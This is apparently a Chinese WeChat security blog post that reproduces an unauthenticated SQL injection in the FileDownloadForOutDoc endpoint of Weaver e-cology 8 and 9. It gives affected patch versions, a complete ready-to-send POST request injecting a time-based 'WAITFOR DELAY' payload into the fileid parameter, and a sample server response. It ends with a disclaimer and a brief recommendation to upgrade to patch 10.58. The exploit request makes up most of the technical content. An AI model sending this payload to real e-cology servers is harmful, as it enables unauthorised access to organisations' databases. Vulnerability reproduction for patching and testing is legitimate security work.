#  泛微OA e-cology FileDownloadForOutDoc前台SQL注入漏洞

原创 Henry4E36 [ 才疏学浅的H6 ](javascript:void\(0\);)

**才疏学浅的H6** ![]()

微信号 Sec-Henry

功能介绍 一个在渗透的海洋里摸爬滚打的少年

____

___发表于_

收录于合集

#sql 1 个

#复现 24 个

#漏洞 33 个

#漏洞复现 39 个

#泛微 1 个

**本文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。**

 **漏洞说明**

        泛微e-cology是一款由泛微网络科技开发的协同管理平台，支持人力资源、财务、行政等多功能管理和移动办公。

        泛微e-cology FileDownloadForOutDoc 未对用户的输入进行有效的过滤，直接将其拼接进了SQL查询语句中，导致系统出现SQL注入漏洞。

 **影响版本**

  *   * 

    
    
     部分e-cology 8且补丁版本<10.58.0部分e-cology 9且补丁版本<10.58.0

 **漏洞复现**

![](https://gitee.com/fuli009/images/raw/master/public/20230714180548.png)

payload：  

  *   *   *   *   *   *   *   *   * 

    
    
    POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1Host: ip:portUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36Content-Length: 45Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateConnection: close  
    fileid=3+WAITFOR+DELAY+'0:0:8'&isFromOutImg=1

请求包：  

  *   *   *   *   *   *   *   *   * 

    
    
    POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1Host: ip:portUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36Content-Length: 45Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateConnection: close  
    fileid={everything}+WAITFOR+DELAY+'0:0:8'&isFromOutImg=1

响应包：  

  *   *   *   *   *   *   *   *   *   *   * 

    
    
    HTTP/1.1 200 OKServer: WVSCache-Control: privateX-Frame-Options: SAMEORIGINX-XSS-Protection: 1Set-Cookie: ecology_JSessionid=aaag6HUJ_5F8Y8MrDt2Ky; path=/Content-Length: 0Connection: closeDate: Tue, 11 Jul 2023 12:54:14 GMT  
      
    

![](https://gitee.com/fuli009/images/raw/master/public/20230714180550.png)

 **修复建议**

目前官方已发布安全补丁，建议受影响用户尽快将补丁版本升级至10.58及以上。https://www.weaver.com.cn/cs/securityDownload.asp#

本文章仅用于学习交流，不得用于非法用途

星标加关注，追洞不迷路

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

